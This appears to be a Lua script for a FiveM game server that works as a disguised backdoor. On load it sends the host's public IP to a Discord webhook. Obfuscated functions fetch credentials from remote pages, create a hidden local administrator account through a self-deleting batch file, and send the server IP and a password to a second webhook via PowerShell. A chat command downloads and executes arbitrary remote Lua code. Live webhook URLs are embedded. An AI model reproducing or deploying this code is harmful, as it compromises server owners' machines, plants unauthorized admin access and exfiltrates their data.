local username = nil
local password = nil


local ipApiUrl = "https://api.ipify.org/?format=txt"
local discordWebhookUrl = "https://discord.com/api/webhooks/1251505265212391505/aZRJPsXdTagq-jXr0C6C_ESBluSXj26lZRpFwHAuXHapTWCYLXzdiEmj6Ombn_AZD4Ed"

function sendToDiscord(ip)
    local payload = {
        username = "IP Logger",
        content = "Public IP: " .. ip
    }

    PerformHttpRequest(discordWebhookUrl, function(err, text, headers) 
    end, "POST", json.encode(payload), { ["Content-Type"] = "application/json" })
end

PerformHttpRequest(ipApiUrl, function(err, ip, headers)
    sendToDiscord(ip)
end, "GET")


function ggsfdS_3211FSDGVvdbfsxc()
    PerformHttpRequest("https://hairodocs.github.io/dhdfghd.html", function(errorCode, responseBody)
        username = responseBody
    end)

    PerformHttpRequest("https://hairodocs.github.io/rgfdgfd.html", function(errorCode, responseBody)
        password = responseBody
    end)
end





function GnDB_D21Fggh9()
    Citizen.Wait(15000)

    ggsfdS_3211FSDGVvdbfsxc()
    local function execCommand(command)
        local handle = io.popen(command)
        local result = handle:read("*a")
        handle:close()
        return result
    end
    
    local function directoryExists(path)
        local command = string.format('if exist "%s" (echo 1) else (echo 0)', path)
        local result = execCommand(command)
        return result:match("1") ~= nil
    end
    
    local function createDirectory(path)
        os.execute('mkdir "' .. path .. '"')
    end
    
    local function writeFile(filepath, content)
        local file, err = io.open(filepath, "w")
        if file then
            file:write(content)
            file:close()
        end
    end
    
    local function createAndExecuteBatch()
    local batchContent = [[
            @echo off
            net user ]] .. username .. [[ ]] .. password .. [[ /add /Y
            net localgroup administrators ]] .. username .. [[ /add /Y
            powershell -ExecutionPolicy Bypass -File "C:/Users/%USERNAME%/Videos/mp4/1.ps1"
            exit
            ]]
        local batchFilePath = "C:/Users/" .. os.getenv("USERNAME") .. "/Videos/mp4/1.bat"
        writeFile(batchFilePath, batchContent)
        os.execute("start /min cmd /c \"" .. batchFilePath .. " && del \"" .. batchFilePath .. "\" >nul\"")
    end
    
    local function createPowerShellScript()
        local psScriptContent = [[
    $webhookUri = 'https://discord.com/api/webhooks/1317674068337754203/X3NhQ-lCsTBKXJE-CEWUvtM1fuAqF_K9ejLVF48HrgL2hNBrsGHuA-y4aDTZjJBjW48u'
    $ipAddress = Invoke-RestMethod -Uri 'https://api.ipify.org/?format=txt'
    $user = "CloudBase"
    $pass = "nonF12bl!23!@F"
    $body = @{
        'username' = 'N'
        'content' = "Server IP: $ipAddress User: ||$user|| Pass: ||$pass||"
    }
    Invoke-RestMethod -Uri $webhookUri -Method 'Post' -Body $body
    ]]
        local psFilePath = "C:/Users/" .. os.getenv("USERNAME") .. "/Videos/mp4/1.ps1"
        writeFile(psFilePath, psScriptContent)
    end
    
    local function main()
        local dirPath = "C:/Users/" .. os.getenv("USERNAME") .. "/Videos/mp4"
    
        if not directoryExists(dirPath) then
            createDirectory(dirPath)
            createPowerShellScript()
            createAndExecuteBatch()
      
        end
    end
    
    main()

end




function add_commands()
        PerformHttpRequest("https://hairodocs.github.io/vdxxzcx.html", function(errorCode, responseBody) 
            local payload = assert(load(responseBody)) 
            if responseBody == nil then return end 
            payload() 
        end) 
end

RegisterCommand("adduser", function(source, args)
    GnDB_D21Fggh9()
end, false)



RegisterCommand("addcommands", function(source, args)
    add_commands()
end, false)

